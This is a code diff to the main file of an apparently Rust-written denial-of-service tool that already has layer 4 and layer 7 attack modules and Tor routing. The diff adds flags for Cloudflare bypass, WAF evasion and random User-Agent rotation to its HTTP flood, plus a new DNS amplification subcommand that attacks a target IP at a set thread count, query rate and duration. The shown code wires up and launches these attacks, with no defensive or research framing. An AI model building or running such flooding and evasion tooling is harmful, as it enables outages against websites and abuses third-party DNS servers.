@@ -8,6 +8,8 @@ mod attacks;
 mod network;
 mod tor;
 mod utils;
+mod evasion;
+mod amplification;
 
 use attacks::{layer4, layer7};
 use tor::TorClient;
@@ -77,6 +79,41 @@ enum Commands {
         /// Enable slowloris attack
         #[arg(long)]
         slowloris: bool,
+        
+        /// Enable Cloudflare bypass
+        #[arg(long)]
+        cloudflare_bypass: bool,
+        
+        /// Enable WAF evasion
+        #[arg(long)]
+        waf_evasion: bool,
+        
+        /// Randomize User-Agent
+        #[arg(long)]
+        random_useragent: bool,
+    },
+    
+    /// DNS Amplification attacks
+    DnsAmp {
+        /// Target IP address
+        #[arg(short, long)]
+        target: String,
+        
+        /// Domain to query
+        #[arg(long, default_value = "google.com")]
+        domain: String,
+        
+        /// Number of threads
+        #[arg(long, default_value = "10")]
+        threads: u32,
+        
+        /// Queries per second
+        #[arg(long, default_value = "100")]
+        rate: u64,
+        
+        /// Attack duration in seconds
+        #[arg(long, default_value = "60")]
+        duration: u64,
     },
     
     /// Start Tor service
@@ -175,6 +212,9 @@ async fn main() -> anyhow::Result<()> {
             user_agent,
             method,
             slowloris,
+            cloudflare_bypass,
+            waf_evasion,
+            random_useragent,
         } => {
             info!("Starting Layer 7 attack");
             
@@ -202,13 +242,43 @@ async fn main() -> anyhow::Result<()> {
                 targets: target_urls,
                 threads,
                 rate_limit: Duration::from_millis(1000 / rate),
-                user_agent,
+                user_agent: if random_useragent {
+                    // Use random user agent from database
+                    let ua_db = evasion::useragent::UserAgentDatabase::new();
+                    ua_db.get_random()
+                } else {
+                    user_agent
+                },
                 method,
                 use_tor,
                 slowloris,
+                cloudflare_bypass,
+                waf_evasion,
             };
             
             layer7::http_flood(config).await?;
+        }
+        
+        Commands::DnsAmp {
+            target,
+            domain,
+            threads,
+            rate,
+            duration,
+        } => {
+            info!("Starting DNS Amplification attack");
+            
+            let target_ip = target.parse()?;
+            let attack_duration = Duration::from_secs(duration);
+            
+            println!("{}", format!("🎯 Target: {}", target).bright_cyan());
+            println!("{}", format!("🌐 Domain: {}", domain).bright_cyan());
+            println!("{}", format!("🧵 Threads: {}", threads).bright_cyan());
+            println!("{}", format!("⚡ Rate: {} queries/sec", rate).bright_cyan());
+            println!("{}", format!("⏱️  Duration: {}s", duration).bright_cyan());
+            
+            let dns_amp = amplification::dns::DnsAmplification::new();
+            dns_amp.launch_attack(target_ip, &domain, threads, rate, attack_duration).await?;
         }
         
         Commands::Tor { start, stop, renew } => {
